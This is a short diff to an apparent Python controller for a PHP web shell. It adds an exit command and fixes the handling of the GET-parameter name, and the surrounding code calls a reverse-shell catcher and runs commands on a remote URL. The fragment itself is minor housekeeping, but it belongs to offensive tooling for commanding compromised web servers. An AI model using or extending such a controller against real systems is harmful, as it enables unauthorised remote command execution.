@@ -89,6 +89,9 @@ class PHP_Shell_Handler:
             elif cmd.upper().startswith("SHELL"):
                 self.catch_reverse_shell()
 
+            elif cmd.upper() == "QUIT" or cmd.upper() == "EXIT":
+                sys.exit(1)
+                
             else:
                 print(self._exec_cmd(cmd))
 
@@ -103,11 +106,15 @@ def main():
     args = arg_parser.parse_args()
 
     url = args.url
+
+    php_param_name = None
     if args.phpparam:
         php_param_name = args.phpparam
+
     encoded = False
     if args.encoded != None:
         encoded = True
+
     if php_param_name:
         handler = PHP_Shell_Handler(url, encoded=encoded, webshell_get_param=php_param_name)
     else:
